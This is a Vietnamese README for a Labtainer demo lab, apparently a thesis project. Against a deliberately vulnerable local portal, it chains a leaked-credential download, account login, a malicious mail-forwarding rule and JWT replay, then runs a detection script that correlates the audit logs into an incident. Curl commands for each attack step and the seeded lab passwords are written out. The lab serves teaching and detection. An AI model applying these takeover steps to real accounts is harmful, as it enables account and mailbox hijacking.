# Lab DEMO: Chuỗi Identity & Session Hijacking (Labtainer)

## Mục đích

Một lab **demo tổng hợp** chạy trọn chuỗi tấn công của DATN trong một lần
`labtainer`:

```
B1 lộ credential  ->  B2 chiếm tài khoản  ->  B3 chiếm hộp thư
                  ->  B4 chiếm JWT/session -> B5 phiên cũ sống sót sau đổi mật khẩu
                  ->  Detection: gom log thành incident
```

Đây là **demo, KHÔNG chấm điểm** (không Result Tag, goals.config,
checkwork, anti-cheat). Bằng chứng là output trên terminal và các dòng
audit log JSONL do portal ghi ra.

## Kiến trúc container

| Container | IP (LAB_NET) | Vai trò |
|---|---|---|
| `victim-portal` | 172.26.0.2 | DATN Portal: FastAPI + SQLite + webmail + JWT API + audit log JSONL |
| `attacker` | 172.26.0.3 | Máy tấn công: terminal chính (curl, jq, python3) + Firefox GUI |
| `victim` | 172.26.0.4 | Nạn nhân user01: script tự đăng nhập hợp lệ tạo baseline |
| `monitor` *(analyst/SOC — trọng tâm)* | 172.26.0.5 | `detect.py`: diff forwarding rule so baseline/allowlist, phát hiện login IP/UA lạ, token reuse cùng `jti`, gom incident + risk score + timeline + `alerts.log` + metrics |

- Mạng: `172.26.0.0/24` (đúng chuẩn 3 lab trước), gateway `172.26.0.1`.
- Audit log: `/var/log/datn/app.jsonl` (ngoài `/home`, không bị Labtainer
  dọn khi khởi tạo).
- Portal seed sẵn 2 forwarding rule **hợp lệ** (`user01 -> user01.archive@datn.local`,
  `admin -> assistant@datn.local`) làm baseline inventory cho phần Detection.
- Không cần VM Windows/Kali; mỗi "máy" là một container.

## Tài khoản seed

| Email | Mật khẩu | Role | Ghi chú |
|---|---|---|---|
| `user01@datn.local` | `Us3r01_DATN!2026` | user | nạn nhân (mật khẩu bị lộ ở B1) |
| `attacker@datn.local` | `Att4ck3r_DATN!2026` | user | tài khoản của người tấn công |
| `admin@datn.local` | `Adm1n_DATN!2026` | admin | seed cho đủ bộ, không dùng trong demo |

> Mật khẩu chứa `!`: trong bash luôn bọc tham số `-d`/`--data-urlencode`
> bằng **nháy đơn** (`'...'`) để tránh history expansion.

## Cách chạy (khuyến nghị: imodule + DockerHub)

```bash
cd ~/labtainer/labtainer-student
imodule https://github.com/Taamne/tamdtt-hijacking/raw/main/web-attk-identity-session-hijacking/imodule_web-attk-identity-session-hijacking.tar
labtainer web-attk-identity-session-hijacking
```

Image publish tại:
`taamne/web-attk-identity-session-hijacking.{attacker,victim-portal,victim,monitor}.student`
(`https://hub.docker.com/u/taamne`).

Cách thủ công (không dùng imodule): copy thư mục `lab/` vào
`~/labtainer/trunk/labs/web-attk-identity-session-hijacking` rồi chạy
`labtainer` như trên (lần đầu sẽ tự build image).

### GUI web bằng Firefox (X11)

Container `attacker` có `X11 YES` và cài Firefox. Labtainer forward X11 ra
host, nên trong terminal attacker gõ:

```bash
firefox http://172.26.0.2:8000 &
```

Một cửa sổ Firefox thật hiện trên màn hình host; đăng nhập user01 và thao
tác profile/mailbox trực quan.

Nếu host **không có X11**: mở `lab/config/start.config`, comment `X11 YES`
và bỏ comment `PUBLISH 127.0.0.1:8000:8000`, rồi dùng trình duyệt của host
mở `http://127.0.0.1:8000`.

## Kịch bản demo 5 bước + Detection

Toàn bộ lệnh mẫu nằm trong `lab/attacker/instructions.txt` (được hiển thị
trên terminal attacker khi lab chạy). Tóm tắt:

### B1 — Credential compromise

```bash
curl -s http://172.26.0.2:8000/backup/users.csv
```

File backup cũ do HR sync bỏ quên, chứa mật khẩu plaintext của user01.
Audit: `backup_downloaded` (src_ip=172.26.0.3).

### B2 — Account hijacking

```bash
curl -s -o /dev/null -w '%{http_code}\n' -c /tmp/c.jar \
  -X POST http://172.26.0.2:8000/login \
  --data-urlencode 'username=user01@datn.local' \
  --data-urlencode 'password=Us3r01_DATN!2026'

curl -s -o /dev/null -w '%{http_code}\n' -b /tmp/c.jar -c /tmp/c.jar \
  -X POST http://172.26.0.2:8000/profile \
  --data-urlencode 'phone=+84-900-000-000'
```

Audit: `login_success`, `profile_updated` với `src_ip=172.26.0.3`.

### B3 — Email/mailbox hijacking

Mailbox user01 đang có rule hợp lệ `user01 -> user01.archive@datn.local`;
rule dưới đây ghi đè nó — đây là diff mà monitor sẽ phát hiện.

```bash
curl -s -b /tmp/c.jar -c /tmp/c.jar -X POST http://172.26.0.2:8000/mail/forward \
  --data-urlencode 'target=attacker@datn.local'

curl -s -b /tmp/c.jar -c /tmp/c.jar -X POST http://172.26.0.2:8000/mail/send \
  --data-urlencode 'to=user01@datn.local' \
  --data-urlencode 'subject=Forward test' \
  --data-urlencode 'body=This message should be forwarded.'
```

Đăng nhập attacker@datn.local và mở inbox để thấy bản `[FWD]`.
Audit: `mailbox_rule_created`, `mail_forwarded`.

### B4 — Token hijacking (JWT replay)

```bash
curl -s http://172.26.0.2:8000/debug/sessions -o /tmp/sessions.json
JWT=$(jq -r '.sessions[] | select(.type=="jwt" and
       .user_id=="user01@datn.local") | .token' /tmp/sessions.json | head -1)

curl -s -H "Authorization: Bearer $JWT" http://172.26.0.2:8000/api/me
curl -s -H "Authorization: Bearer $JWT" http://172.26.0.2:8000/api/mailbox/summary
```

Token do victim xin từ 172.26.0.4, nhưng được replay từ 172.26.0.3 —
không cần đăng nhập lại. Audit: `api_access` cùng `jti`, `replay=true`.

### B5 — Kiểm tra duy trì phiên

Trong terminal **victim** (172.26.0.4):

```bash
cd /home/ubuntu
./change_password_baseline.sh
```

Sau đó quay lại attacker, replay token cũ:

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  -H "Authorization: Bearer $JWT" http://172.26.0.2:8000/api/me
# -> 200
```

Audit: `password_changed` (baseline, `revoked_sessions=0`) rồi `api_access`
của token cũ vẫn thành công. Chạy `./change_password_baseline.sh hardened`
trên lab mới để so sánh (token cũ bị 401).

### Cơ chế & lỗ hổng bị khai thác (mục 3b của plan)

- **B1 — Credential exposure:** backup export còn plaintext password, không
  có secret management/rotation. Credential hợp lệ là chìa khoá đầu tiên.
- **B2 — Account Hijacking:** xác thực chỉ dựa password — thiếu MFA, không
  ràng buộc thiết bị, không phát hiện login bất thường. Sau login, identity
  bị giả mạo hoàn toàn (IP attacker .3 ≠ baseline victim .4).
- **B3 — Email Hijacking (BEC persistence):** forwarding rule cho phép đọc
  thư tương lai mà không cần đăng nhập lại. Lỗ hổng: thao tác nhạy cảm với
  mailbox không có xác minh lại và không cảnh báo rule mới.
- **B4 — Token Hijacking:** bearer JWT stateless, không ràng buộc IP/thiết
  bị; `/debug/sessions` bị bỏ quên làm lộ raw token + `jti`. Ai giữ token
  là user đó — không cần password, không cần login.
- **B5 — Session persistence:** đổi mật khẩu ở baseline **không** thu hồi
  session/token cũ; token sống độc lập với credential. Đây là lỗ hổng sâu
  nhất của chuỗi (hardened mode là bản so sánh có thu hồi).

### Detection (trọng tâm — container monitor/analyst)

Trong terminal **monitor** (172.26.0.5):

```bash
# 1) Diff rule hiện tại với inventory đã phê duyệt
python3 detector/detect.py --diff

# 2) Correlation đầy đủ (mặc định)
python3 detector/detect.py

# 3) Before/After: control nào chặn signal nào
python3 detector/detect.py --prevention
```

Input: audit log `http://victim-portal:8000/debug/audit`, rule hiện tại
`http://victim-portal:8000/debug/forwarding`, baseline
`detector/known_forwarding.json`, policy `detector/rules.json`
(`allowlist`).

Signal + risk weight:

| Signal | Weight | Ý nghĩa |
|---|---|---|
| `account_hijack` | 30 | login/action từ IP hoặc User-Agent ngoài baseline |
| `mailbox_hijack` | 30 | rule ngoài inventory / mail bị forward / victim mail bị đọc |
| `token_hijack` | 35 | cùng `jti` được dùng từ IP/UA khác nơi cấp |
| `session_not_revoked` | 10 | token cũ vẫn được chấp nhận sau khi đổi mật khẩu |
| `recon` | 5 | `/debug/*` bị gọi từ ngoài baseline (bỏ qua IP monitor) |

Risk score = tổng weight (cap 100): `>=80 critical`, `>=55 high`,
`>=30 medium`, `>0 low`.

Kết quả:

- `~/incident/timeline.csv` — timeline toàn bộ event (forensic).
- `~/incident/incident_summary.json` — incident + `risk_score` + `metrics` +
  `iocs` + `forwarding_diff`.
- `~/incident/alerts.log` — JSONL, mỗi signal/user một alert.
- `~/incident/prevention_report.json` — chỉ khi chạy `--prevention`.

Metrics chính trong `incident_summary.json`:

```
alerts_total, alerts_true_positive, alerts_false_positive,
incidents_total, risk_score_max, incident_linkage_accuracy,
detection_lag_seconds, attack_window_seconds,
forwarding_rules_approved, forwarding_rules_unapproved
```

**Clean-baseline false-positive test:** chạy `detect.py` trước khi attacker
làm B1–B5 → `incidents=0`, `alerts=0`, `alerts_false_positive=0`. Sau khi
chạy đủ chain → 1 incident `critical` cho `user01@datn.local` với đủ
`account_hijack + mailbox_hijack + token_hijack` (kèm
`session_not_revoked`, `recon`), risk score 100.

**Before/After:** `prevention_report.json` map từng control (MFA/device
binding, revoke token khi đổi mật khẩu, forwarding-rule approval/alert, bỏ
debug endpoint) với signal bị chặn. App có sẵn **hardened mode** để retest
B5 (token cũ bị 401); detector đã hiện thực cảnh báo rule ngoài allowlist.

## Audit log

Mỗi dòng JSON tại `/var/log/datn/app.jsonl` có:

```
schema_version, event_id, timestamp (UTC), service, category, event_type,
severity, result, src_ip, user_agent, request_id
```

thêm `user_id`, `jti` cho sự kiện phiên/token, `mailbox`/`rule` cho sự kiện
thư. Log **không** ghi mật khẩu, raw token, Authorization hay cookie.

Các event chính: `login_success`, `login_failed`, `profile_updated`,
`password_changed`, `mail_login`, `mail_read`, `mail_sent`,
`mailbox_rule_created`, `mail_forwarded`, `token_issued`, `api_access`,
`token_rejected`, `debug_sessions_viewed`, `debug_forwarding_viewed`,
`debug_audit_exported`, `backup_downloaded`.

Xem log:

```bash
# terminal victim-portal
tail -f /var/log/datn/app.jsonl | jq -c \
  '{timestamp,event_type,user_id,src_ip,jti,mailbox,rule,result}'

# hoặc từ attacker (debug endpoint bị quên)
curl -s http://172.26.0.2:8000/debug/audit | tail -n 12 | jq -c .
```

## Reset / dừng

```bash
labtainer -r web-attk-identity-session-hijacking  # làm lại từ đầu
stoplab web-attk-identity-session-hijacking       # dừng lab
```

> **Chuyển sang bài lab khác:** các lab dùng chung mạng lab nội bộ nên
> KHÔNG chạy 2 lab cùng lúc. Dọn lab cũ trước:
> ```bash
> stoplab <tên-lab-cũ>
> docker rm -f $(docker ps -aq --filter "name=web-attk-")
> docker network rm lab_net   # bỏ qua lỗi "has active endpoints" nếu còn lab khác
> labtainer <tên-lab-mới>
> ```

## Nguồn lab

Thư mục `lab/` chứa toàn bộ source Labtainer (`config/`, `dockerfiles/`,
`attacker/`, `victim/`, `victim-portal/`, `monitor/`, `instr_config/`,
`docs/`). Không commit build artifact (`home_tar/`, `sys_tar/`, `*.tar.gz`)
hay log máy local.

## Ghi chú build / publish

- Khi push Docker Hub, tắt containerd image store (hoặc convert bằng
  `skopeo copy --format v2s2`) để manifest là Docker v2 Schema2; nếu không,
  Labtainer cũ báo lỗi **"lacking a base version"**.
- Media type trên Docker Hub phải là
  `application/vnd.docker.distribution.manifest.v2+json`.
- Lab này không có `goals.config`/Result Tag; `instr_config/results.config`
  chỉ chứa comment để Labtainer không lỗi khi stop lab.
